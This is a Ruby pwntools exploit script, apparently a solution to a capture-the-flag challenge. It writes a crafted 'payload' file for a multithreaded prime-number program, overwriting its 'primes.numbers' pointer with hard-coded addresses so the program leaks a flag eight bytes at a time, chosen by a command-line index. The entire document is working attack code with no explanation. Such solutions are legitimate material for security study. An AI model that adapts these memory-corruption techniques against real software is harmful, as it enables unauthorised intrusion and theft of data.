#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pwn'        # https://github.com/peter50216/ruby-pwntools

#================= Exploit Start ====================
context.arch = 'amd64'
@str = ''
def send(*args)
  pay = flat(*args)
  fail if pay.size != 4096 * 8
  @str += pay
end

big_prime = 0xf981739793721bf # big prime

def round(*args)
  args.flatten!
  args.concat([2] * (512 - args.size))
end

fat = 3825123056546413051

# To set primes.numbers = 0x605be0
send([3] * 154, [0x3, 0xe000000000000005, 0x280000000000605b], [3] * (160 - 154 - 3), [2] * (4096 - 160)) # Thread A

# &primes.numbers = 0x607439 + 8 * 154 + 8 + 7
send(round([fat] * 512), round([3] * 13, [0x607439] * 4), round * 6) # Thread B

# flag[ARGV[0] * 8, 8]
pad = ARGV[0].to_i
send(round([fat] * 512), round(big_prime, fat, fat, 3, 3, [3] * pad) , round([fat] * 512) * 6) # Thread C

send(round([fat] * 512) * 3, round(7), round([fat] * 512) * 4) # Thread D
send(round([fat] * 512) * 3, round(5), round([fat] * 512) * 4) # Thread E

IO.binwrite('payload', @str)
